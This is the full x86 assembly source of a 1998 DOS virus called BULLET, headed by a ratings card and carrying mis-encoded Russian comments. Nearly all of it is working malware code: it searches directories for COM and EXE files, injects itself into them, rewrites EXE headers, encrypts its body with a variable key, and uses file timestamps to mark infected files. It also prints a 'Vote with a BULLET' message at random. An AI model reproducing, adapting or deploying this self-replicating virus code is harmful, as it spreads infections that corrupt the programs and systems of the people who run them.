   ;       ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;       º  Name:        BULLET  ³ Target: COM,EXE  º
   ;       º  Rating:    UnDanger  ³ Stealth:     No  º
   ;       º  Tsr:         No  ³ Phantom:    Yes  º
   ;       º  Arming:      No  ³ Danger(6):    0  º
   ;       º  Attac Speed:       Slow  ³ Clock:       No  º
   ;       º  Text Strings:       Yes  ³ Echo:   Yes  º
   ;       ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
   ;       º  Find Next Target:   SCANNING DIRECTORY      º
   ;       º  AUTHOR:         SERSOFT             º
   ;       º  Other viruses:      DUMB tiny virus (C)1998 º
   ;       ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   ;       ‘ŠŽŒ*ˆ‹ˆ*Ž‚€’œ ‚ .EXE ”€‰‹
   ;       ‡€*“‘Š: ‚ Ž’‹€„—ˆŠ… **Ž*“‘’ˆ’œ 'CALL DECODE' ˆ RUN
           .486
           MODEL   SMALL
   BULLET_STACK    SEGMENT PARA STACK USE16 'STACK'
           DB  256 DUP (?)
   BULLET_STACK    ENDS

   BULLET_SEG  SEGMENT PARA PUBLIC USE16 'CODE'
           ASSUME  CS:BULLET_SEG , DS:BULLET_SEG , SS:BULLET_STACK
   START:
           PUSH    CS
           POP DS
           CALL    GET_BASE      ;‘Ž‡„€„ˆŒ *€‡“
   GET_BASE:   MOV BP,SP
           MOV AL,[BP]
           MOV AH,[BP+1]
           SUB AX,5
           INC SP
           INC SP
           MOV BP,AX
           PUSH    CS
           POP DS
           CALL    DECODE
   DECRYPTING:
           MOV WORD PTR CS:[BP+CS_BP],BP
           MOV WORD PTR CS:[BP+CS_BP+2],CS

           MOV AX,SS       ;SEG NEW_PLACE=RND(0...7000-SS)
           MOV BX,7000H
           SUB BX,AX       ;‘…ƒŒ…*’ ‘’…Š€ ‚ **Žƒ*€ŒŒ… Ž*›—*Ž
           CALL    RNDWORD     ;*€‡Œ…™€…’‘Ÿ *Ž‘‹…„*ˆŒ - ŠŽ*ˆ*“…Œ
           MOV AX,SS       ;’…‹Ž ‡€ SS
           ADD AX,BX
           ADD AX,1000H
           MOV ES,AX

           MOV SI,BP        ;*…*……‡†€…Œ *€ *Ž‚Ž… Œ…‘’Ž †ˆ’…‹œ‘’‚€
           XOR DI,DI
           MOV CX,VIR_LEN
           CLD
           REP MOVSB

           PUSH    ES
           PUSH    OFFSET CONTINUE
           RETF
   CONTINUE:
           PUSH    DS  ;ES - ‘’€*›‰ 'CODE' ‘…ƒŒ…*’
           POP ES

           PUSH    CS
           POP DS

           MOV DI,BP       ;‡€’*…Œ ‚ˆ*“‘ *€ ‘’€*ŽŒ Œ…‘’…
           MOV CX,VIR_LEN
           MOV AL,00H
           REP STOSB

           MOV AH,1AH          ;“‘’€*Ž‚ˆŒ *Ž‚›‰ DTA
           MOV DX,OFFSET NEW_DTA
           INT 21H

           MOV AH,19H   ;’…Š“™ˆ‰ „ˆ‘Š - ”‹Ž*ˆŠ ?
           INT 21H
           CMP AL,2
           JNC NEXT

           MOV CX,400h    ;PROTECTED DISK - ?
           MOV DX,3F5h
           MOV AL,4
           OUT DX,AL
           LOOP    $      ;†„…Œ

           MOV CX,400h
           OUT DX,AL
           LOOP    $      ;†„…Œ

           IN  AL,DX
           TEST    AL,40h
           JNZ PROTECT     ;*… ‡€*€†€Ÿ…Œ
   NEXT:
           CALL    INFECT_COM    ;ˆ*”ˆ–ˆ*“…Œ ”€‰‹›
           CALL    INFECT_EXE
   PROTECT:

   ;**Ž—ˆ… „…‰‘’‚ˆŸ
           MOV BL,0FFH
           CALL    RND
           CMP BL,64
           JNC TEMP3

           MOV DX,OFFSET LOSUNG   ;‚ 1/4 ‘‹“—€… ‚›‚Ž„ˆŒ ‘’*ŽŠ“
           MOV AH,9H
           INT 21H

   TEMP3:
           CMP WORD PTR [INF_DEF],'EX'
           JE  RESTORE_EXE
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍ COM FILE PROCSÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   RESTORE_COM PROC
           CALL    RESTORE_DTA

           MOV DI,WORD PTR CS:[CS_BP] ;‚Ž‘‘’€*Ž‚ˆŒ ‚’Ž*“ž —€‘’œ
           MOV SI,DI
           ADD SI,VIR_LEN
           MOV CX,0001H
   OLD_BYTES   EQU $-2
           PUSH    DS
           POP ES

           CLD
           REP MOVSB

           XOR EAX,EAX     ;‚Ž‘‘’€*Ž‚ˆŒ ‘Ž‘’ŽŸ*ˆ…
           XOR BX,BX
           XOR CX,CX
           XOR DX,DX
           XOR SI,SI
           XOR DI,DI
           XOR BP,BP

           PUSH    ES      ;*€ ‚›•Ž„ Š **Žƒ…
           PUSH    WORD PTR 100H
           RETF

   RESTORE_COM ENDP

   INFECT_COM  PROC
           CMP WORD PTR [INF_DEF],'EX' ;‡€*€†…*ˆ… ˆ„…’ ‘ .EXE ”€‰‹€
           JE  TEMP4           ;*Ž*’ŽŒ“ *€‰’› *… ‚Ž‘‘’-‘Ÿ

           MOV ES,[CS_BP+2]  ;ES-PSP INF.PRG. , DS-*€˜ ‘…ƒŒ…*’
           XOR BX,BX         ;*€‡€
           MOV DI,100H
           CALL    EXCHANGE    ;‚Ž‘‘’€*Ž‚ˆŒ *€‰’›
   TEMP4:
           MOV AX,CS       ;ES - ‘‹…„“ž™ˆ‰ *…*…*…Š*›‚€ž™ˆ‰‘Ÿ
           ADD AX,1000H    ;‘ CS ‘…ƒŒ…*’
           MOV ES,AX

           MOV DX,OFFSET COM_MASK
           CALL    FIND_TARGET
   ANALYS_COM:
           CMP DWORD PTR [NEW_DTA+1EH],'MMOC'
           JE  F_NEXT

           MOV CX,WORD PTR [NEW_DTA+1AH]

           CMP CX,LEN_JUMP+20H
           JC  F_NEXT      ;LEN_FILE < LEN_JUMP+20H

           ADD CX,VIR_LEN+100H
           JC  F_NEXT      ;LEN_FILE+VIR_LEN+100H > 0FFFFH

           CALL    SAVE_TIME   ;‘Ž•*€*ˆŒ ‚*…ŒŸ
           MOV AL,CL
           SHL AL,3
           CMP AL,11111000B    ;62 ‘…Š“*„›

           JNE OKAY
   F_NEXT:
           PUSH    OFFSET ANALYS_COM
           JMP FIND_NEXT   ;ˆ™…Œ ‘‹…„“ž™ˆ‰
   OKAY:
   ;*.COM ”€‰‹ *Ž‹*Ž‘’œž *Ž„•Ž„ˆ’ „‹Ÿ ‡€*€†…*ˆŸ

           MOV BX,WORD PTR [NEW_DTA+1AH]   ;„‹ˆ**€ ”€‰‹€
           SUB BX,LEN_JUMP+10H ;Ž**…†…Œ ƒ*€*ˆ–› „‹Ÿ RND

           CALL    RNDWORD

           ADD BX,LEN_JUMP+8H
           MOV [RND_PLACE],BX
           PUSH    BX

           CALL    LSEEK    ;‚ *€—€‹Ž ”€‰‹€

           POP CX
           MOV AH,3FH
           XOR DX,DX
           MOV BX,[HANDLE]
           PUSH    DS      ;‘Ž•*€*ˆŒ -=DS=-
           PUSH    ES      ;‘—ˆ’€…Œ Š“‘ŽŠ [RND_PLACE]
           POP DS
           INT 21H
           POP DS      ;‚Ž‘‘’€*Ž‚ˆŒ -=DS=-

           MOV DI,[RND_PLACE]
           XOR SI,SI
           CLD          ;*…*…*…‘…Œ ’…‹Ž - ‚*…†…Œ ‚ ”€‰‹
           MOV CX,VIR_LEN
           REP MOVSB

           MOV DX,DI
           MOV CX,WORD PTR [NEW_DTA+1AH]
           MOV BX,[RND_PLACE]
           SUB CX,BX             ;‘Ž•*€*ˆŒ Ž‘’€‹œ*“ž „‹ˆ**“
           MOV WORD PTR ES:[BX+OFFSET OLD_BYTES],CX
           MOV BX,[HANDLE]    ;„Ž—ˆ’€…Œ Ž‘’€’ŽŠ
           MOV AH,3FH

           PUSH    DS   ;‘Ž•*€*ˆŒ -=DS=-
           PUSH    ES
           POP DS
           INT 21H

           MOV BX,CS:[RND_PLACE]
           MOV WORD PTR ES:[BX+INF_DEF],'CO'

           MOV DX,BX
           ADD DX,100H
           MOV ES:[BX+OFFSET JUMP_ADDR],DX

           XOR DI,DI
           CALL    EXCHANGE    ;ES , DS = ‘…ƒŒ…*’ ‡€*€†…*ˆŸ

           PUSH    BX
           XOR BL,BL     ;KEY = RND (0...255)
           NOT BL    ;‡€˜ˆ”*“…Œ ‚ˆ*“‘
           CALL    RND
           MOV AL,BL
           POP BX    ;BX = [RND_PLACE] + 100H
           MOV ES:[BX+OFFSET KEY],AL
           MOV BP,BX         ;*Ž‚€Ÿ *€‡€ „‹Ÿ ŠŽ„…*€
           MOV BYTE PTR CS:[KEY],AL
           CALL    DECODE

           CALL    LSEEK    ;Ž’œ…„…Œ *€ *€—€‹Ž „‹Ÿ *Ž‹*ŽƒŽ 'UPDATE'

           MOV CX,WORD PTR CS:[NEW_DTA+1AH]
           ADD CX,VIR_LEN
           MOV BX,CS:[HANDLE]
           XOR DX,DX
           MOV AH,40H       ;‡€*ˆ˜…Œ ‡€*€†…**›‰ ”€‰‹
           INT 21H

           POP DS      ;‚Ž‘‘’€*Ž‚ˆŒ -=DS=-

           CALL    RESTORE_TIME    ;‚Ž‘‘’€*Ž‚ˆŒ ‚*…ŒŸ

           MOV BX,[HANDLE]
           MOV AH,3EH      ;‡€Š*Ž…Œ ‡€*€†…**›‰ ”€‰‹
           INT 21H
           RET
   INFECT_COM  ENDP
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ**Ž–…„“*€ Ž*Œ…*€ *€‰’Ž‚ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   EXCHANGE    PROC
           MOV SI,OFFSET JUMP_VIR
           ADD SI,BX
           MOV CX,LEN_JUMP  ;Ž*Œ…* Ž*ˆƒˆ*€‹œ*›• *€‰’Ž‚
   TEMP2:                   ;*€ ‘ˆƒ*€’“*“ 'JUMP_VIR'
           MOV AL,DS:[SI]   ;ˆ *€Ž*Ž*Ž’
           XCHG    ES:[DI],AL
           MOV DS:[SI],AL
           INC SI
           INC DI
           DEC CX
           JNE TEMP2
           RET
   EXCHANGE    ENDP
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍ EXE FILE PROCS ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   RESTORE_EXE PROC
           CALL    RESTORE_DTA

           XOR EAX,EAX     ;‚Ž‘‘’€*Ž‚ˆŒ ‘Ž‘’ŽŸ*ˆ…
           XOR ECX,ECX
           XOR BX,BX
           XOR DX,DX
           XOR SI,SI
           XOR DI,DI
           XOR BP,BP

           JMP DWORD PTR CS:[EXE_CS_IP]   ;*€ ‚›•Ž„ Š **Žƒ…
   RESTORE_EXE ENDP

   INFECT_EXE  PROC

           XOR SI,SI       ;**Ž„“*‹ˆ*“…Œ ‚ˆ*“‘ *€ ES:1000H
           MOV DI,4096
           MOV CX,VIR_LEN
           CLD
           MOV AX,CS
           ADD AX,1000H
           MOV ES,AX
           REP MOVSB

           MOV DX,OFFSET EXE_MASK  ;*Žˆ‘Š
           CALL    FIND_TARGET

   ANALYS_EXE: MOV CX,4096
   HDRCNT      EQU $-2
           XOR DX,DX       ;**Ž—ˆ’€…Œ ‡€ƒŽ‹Ž‚ŽŠ
           MOV BX,[HANDLE]
           MOV AH,3FH
           PUSH    DS
           PUSH    ES
           POP DS
           INT 21H
           POP DS
           JC  EXE_NEXT

           CMP WORD PTR ES:[MZ],'ZM'
           JNE EXE_NEXT

           MOV AX,ES:[RELOCNT]
           SHL AX,2
           ADD AX,ES:[TABLOFF]
           MOV DX,AX       ;€„*…‘ RELO ELEM ‚›˜…‹ ‡€ ƒ*€*ˆ–›
                       ;HEADER  - .EXE *… *Ž„•Ž„ˆ’
           MOV AX,ES:[HDRSIZE]
           SHL AX,4
           CMP DX,AX
           JNC EXE_NEXT

           CALL    SAVE_TIME
           MOV AL,CL
           SHL AL,3
           CMP AL,11111000B
           JE  EXE_NEXT          ;.EXE “†… ‡€*€†…*

           CMP WORD PTR ES:[CHKSUM],1998H
           JNE OKAY_EXE
   EXE_NEXT:
           PUSH    OFFSET ANALYS_EXE
           JMP FIND_NEXT

   ;*.EXE ”€‰‹ *Ž‹*Ž‘’œž *Ž„•Ž„ˆ’ „‹Ÿ ‡€*€†…*ˆŸ

   OKAY_EXE:
           MOV AX,4202H    ;Ž’œ…„…Œ ‚ ŠŽ*…–
           XOR CX,CX
           MOV DX,CX
           INT 21H

           MOV AX,ES:[PARTPAG]  ;‘ŠŽ‹œŠŽ ‚›*Ž‚*Ÿ’œ
           AND AX,15
           JZ  NULL  ;*ˆ—…ƒŽ *… ‚›*€‚*ˆ‚€’œ
           MOV CX,16
           SUB CX,AX
           PUSH    CX

           MOV DI,VIR_LEN+10H  ;‚›*€‚*ˆ‚€’œ *“„…Œ *“‹ŸŒˆ
           MOV DX,DI
           XOR EAX,EAX
           MOV CX,10H
   TEMP6:      MOV [DI],EAX
           ADD DI,4
           LOOP    TEMP6

           POP CX
           MOV AH,40H        ;‚›*Ž‚*Ÿ…Œ *€ ƒ*€*ˆ–“ *€*€ƒ*€”€
           MOV BX,[HANDLE]
           INT 21H
   NULL:
           PUSH    AX   ;---===‘Ž•*€*Ÿ…Œ —ˆ‘‹Ž ‚›*€‚*ˆ‚€ž™ˆ• *€‰’===---

           MOV ES:WORD PTR [CHKSUM],1998H  ;CHKSUM = 1998H
           MOV ES:[4096+INF_DEF],'EX'   ;ˆ„…*’ˆ”ˆŠ€’Ž*

           MOV EAX,ES:[EXEIP]
           MOV ES:DWORD PTR [4096+EXE_CS_IP],EAX   ;SAVE CS:IP

           MOV AX,ES:[RELOCNT]     ;AX = TABLOFF+RELOCNT*4
           SHL AX,2            ;€„*…‘ NEW_ELEM ‚ TABLOFF
           MOV BX,AX
           ADD AX,ES:[TABLOFF]
           CMP AX,BX          ;*…ŠŽ**…Š’*›‰ .EXE HEADER:
           JNE TEMP7          ;TABLOFF=0000H - *…’ RELOC *‹…Œ…*’Ž‚
           MOV AX,1CH         ;„…‹€…Œ *…*‚›‰ *Ž €„*…‘“ 1CH
           MOV ES:[TABLOFF],AX
   TEMP7:
           MOV BX,AX
           MOV AX,ES:[PAGECNT]
           CMP WORD PTR ES:[PARTPAG],0000H
           JZ  $+3
           DEC AX      ;…‘‹ˆ PARTPAG=0,’Ž PAGECNT *€
           MOVZX   EAX,AX      ;…„ˆ*ˆ–“ *… “Œ…*œ˜€…Œ
           SHL EAX,9
           MOV CX,ES:[HDRSIZE]
           SHL CX,4
           NEG CX
           ADD CX,ES:[PARTPAG]
           MOVSX   ECX,CX
           ADD EAX,ECX  ;FILE_LEN=(PAGECNT -1)*512-HDRSIZE*16+PARTPAG

           SHR EAX,4

           MOV CL,BYTE PTR ES:[PARTPAG]
           AND CL,15
           JZ  $+3 ;*€*€ƒ*€” *… „Ž*€‚‹Ÿ’œ

           INC AX  ;NEW_FILE_CS=FILE_LEN/16 +1

           MOV ES:WORD PTR [BX],OFFSET EXE_CS_IP+2
           MOV ES:[BX+2],AX   ;NEW_ELEM = SEG REAL_CS:IP

           MOV CX,ES:[RELOSS]
           CMP CX,AX
           JC  TEMP8
           MOV DX,VIR_LEN+10H    ;…‘‹ˆ ‘’…Š **Žƒ*€ŒŒ› - 'NOTINIT'
           SHR DX,4          ;…‘‹ˆ Ž* *…*…Š*›‚€…’‘Ÿ ‘ ‚ˆ*“‘ŽŒ
           ADD DX,AX         ;‡€Œ…*Ÿ…Œ …ƒŽ *€ ‘’…Š 'NOTINIT'
           CMP CX,DX         ;‡€ ‚ˆ*“‘ŽŒ - “‚…‹ˆ—ˆ‚€…Œ [MINMEM]
           JNC TEMP8
           SUB DX,AX
           ADD ES:[MINMEM],DX
           ADD DX,AX
           MOV ES:[RELOSS],DX
   TEMP8:
           ROR EAX,16
           XOR AX,AX
           MOV ES:[EXEIP],EAX  ;CS:IP = NEW_CS:0000H

           INC WORD PTR ES:[RELOCNT]

           POP CX  ;---===‚Ž‘‘’. —ˆ‘‹Ž ‚›*€‚*ˆ‚€ž™ˆ• *€‰’===---

           MOV AX,ES:[PARTPAG]
           AND AX,AX       ;PARTPAG=AX=0000H - ?
           JNZ TEMP5

           MOV DX,VIR_LEN
           ADD DX,CX   ;DX=VIRLEN+’Ž —’Ž ‚›*Ž‚*Ÿ‹ˆ
           AND DX,511
           JZ  TEMP5

           INC WORD PTR ES:[PAGECNT]
   TEMP5:
           ADD AX,VIR_LEN
           ADD AX,CX       ;AX=VIRLEN+’Ž —’Ž ‚›*Ž‚*Ÿ‹ˆ

           PUSH    AX
           SHR AX,9
           ADD ES:[PAGECNT],AX ;PAGECNT=PAGECNT+(PARTPAG+VIR_LEN)/512

           POP AX
           AND AX,511
           MOV ES:[PARTPAG],AX ;PARTPAG=PARTPAG+VIR_LEN *Ž ŒŽ„“‹ž 512

           XOR BL,BL     ;KEY = RND (0...255)
           NOT BL    ;‡€˜ˆ”*“…Œ ‚ˆ*“‘
           CALL    RND
           MOV BYTE PTR ES:[4096+KEY],BL
           MOV BP,4096     ;*Ž‚€Ÿ *€‡€ „‹Ÿ ŠŽ„…*€
           MOV BYTE PTR CS:[KEY],BL
           PUSH    DS
           PUSH    ES
           POP DS
           PUSH    BP
           CALL    DECODE

           POP DX      ;DX=1000H
           MOV BX,CS:[HANDLE]
           MOV CX,VIR_LEN  ;*ˆ˜…Œ ’…‹Ž
           MOV AH,40H
           INT 21H

           CALL    LSEEK
           MOV AH,40H      ;UPDATE HEADER
           MOV CX,ES:[HDRSIZE]
           SHL CX,4
           XOR DX,DX
           INT 21H
           POP DS

           CALL    RESTORE_TIME

           MOV BX,[HANDLE]
           MOV AH,3EH
           INT 21H
           RET
   INFECT_EXE  ENDP

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ‘‹“†…**›… **Ž–…„“*›ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   RESTORE_DTA PROC
           MOV AH,51H      ;ES , DS = PSP
           INT 21H
           MOV ES,BX
           MOV DS,BX

           MOV AH,1AH      ;‚…**…Œ DTA *€ Œ…‘’Ž
           MOV DX,80H
           INT 21H
           RET
   RESTORE_DTA ENDP

   RNDWORD     PROC
           PUSH    AX
           MOV AL,BH    ;BX = RND(0...BH)*256 + RND(0...BL)
           CALL    RND
           XCHG    AL,BL
           CALL    RND
           XCHG    BH,BL
           MOV BL,AL
           POP AX
           RET
   RNDWORD     ENDP

   SAVE_TIME   PROC
           MOV AX,5700H    ;*Ž‹“—ˆŒ „€’“
           MOV BX,CS:[HANDLE]
           INT 21H
           PUSH    CX
           OR  CL,00011111B        ;62 ‘…Š“*„›
           MOV WORD PTR [TIME],CX
           MOV WORD PTR [DATE],DX
           POP CX
           RET
   SAVE_TIME   ENDP

   RESTORE_TIME    PROC
           MOV AX,5701H     ;“‘’€*Ž‚ˆŒ ‘’€*Ž… ‚*…ŒŸ
           MOV CX,0000H     ;[TIME]
   TIME        EQU $-2
           MOV DX,0000H     ;[DATE]
   DATE        EQU $-2
           INT 21H
           RET
   RESTORE_TIME    ENDP

   FIND_TARGET PROC
           MOV CX,23H      ;‘Š*›’›‰ , €*•ˆ‚*›‰ , READ ONLY
           MOV AH,4EH
           INT 21H     ;DX = Œ€‘Š€ ”€‰‹€
           JC  FILE_NOT_FOUND
   FILE_FOUND:
           MOV AX,3D02H
           MOV DX,OFFSET NEW_DTA+1EH   ;€„*…‘ ˆŒ…*ˆ ”€‰‹€ ‚ DTA
           INT 21H
           JC  FIND_NEXT
           MOV [HANDLE],AX
           RET
   FIND_NEXT:
           MOV BX,[HANDLE] ;‡€Š*Ž…Œ *…*Ž„•Ž„Ÿ™ˆ‰
           MOV AH,3EH
           INT 21H

           MOV AH,4FH      ;*€‰„…Œ ‘‹…„“ž™ˆ‰
           MOV DX,OFFSET NEW_DTA
           MOV CX,23H
           INT 21H
           JNC FILE_FOUND
   FILE_NOT_FOUND:
           STC     ;*Ž‹*›‰ ‚›•Ž„ ˆ‡ ŒŽ„“‹Ÿ ‡€*€†…*ˆŸ
           INC SP
           INC SP
           RET
   FIND_TARGET ENDP

   LSEEK       PROC
           MOV BX,CS:[HANDLE]
           MOV AX,4200H
           XOR CX,CX
           MOV DX,CX
           INT 21H
           RET
   LSEEK       ENDP

   RND     PROC
           PUSH    AX

           OR  BL,BL   ; BL= RND (0..BL)  *o«ãç¨âì á«ãç ©ë© ¡ ©â
           JZ  EXRND   ; Ž¡ã«ï¥â BH   ¢ëåo¤¥.
                   ; RND(0..0)=0

           INC BL  ; ¤«ï 0FFh ¥  ¤o +1
           JNZ OKK
           DEC BL
   OKK:
           MOV AX,0100H    ; à §¬¥à ¥¤¨¨ço£o oâà¥§ª 
           DIV BL
           NOT AH

           XCHG    AL,BL
           IN  AL,40H
           CMP AL,AH   ; …á«¨ RND ¡o«ìè¥, ç¥¬ …¤Žâà*‚¥àåƒà ,
           JBE OKK1    ; âo o¡à¥§ ¥¬ ¤o E¤Oâà*‚¥àåƒà 
           MOV AL,AH
   OKK1:
           XOR AH,AH   ; „¥«¨¬ ¯o«ãç¥ë© RND-¡ ©â   …¤¨¨ç.Žâà¥§oª
           DIV BL
           MOV BL,AL
           XOR BH,BH
   EXRND:
           POP AX
           RET
   RND     ENDP

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍBULLET VIRUS DATA AREAÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   CS_BP       DD  0
   HANDLE      DW  0
   RND_PLACE   DW  0
   INF_DEF     DW  'EX'
   NEW_DTA     DB  30H DUP (?)
   COM_MASK    DB  '*.COM',0
   EXE_MASK    DB  '*.EXE',0
   VIRUS       DB  'BULLET virus (C) 1998 <Nsk> by SERSOFT'
   LOSUNG      DB  13,10,'Vote with a BULLET ',13,10,'$'
   JUMP_VIR:
           PUSHF
           MOV BP,SP
           MOV WORD PTR SS:[BP],0DEADH
   JUMP_ADDR   EQU $-2
           RET
   LEN_JUMP    EQU $-OFFSET JUMP_VIR
   DECODE_LEN  EQU $-OFFSET DECRYPTING
   EXE_CS_IP   DW  0000H,(SEG BULLET_SEG-10H)
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍHEADER EQUALSÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   MZ      EQU   0
   PARTPAG     EQU   2
   PAGECNT     EQU   4
   RELOCNT     EQU   6
   HDRSIZE     EQU   8
   MINMEM      EQU   10
   MAXMEM      EQU   12
   RELOSS      EQU   14
   EXESP       EQU   16
   CHKSUM      EQU   18
   EXEIP       EQU   20
   RELOCS      EQU   22
   TABLOFF     EQU   24
   OVERLAY     EQU   26
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   DECODE:
           MOV SI,OFFSET DECRYPTING
           MOV CX,DECODE_LEN
           ADD SI,BP   ;SI = BP+DECRYPTING
           MOV AL,65
   KEY     EQU $-1
           NOP
   CRYPTING:   XOR DS:[SI],AL

           NEG AL
           ROL AL,1
           NOT AL

           INC SI
           DEC CX
           JNE CRYPTING
           RET
   VIR_LEN     EQU $-OFFSET START

   BULLET_SEG  ENDS
                   END  START
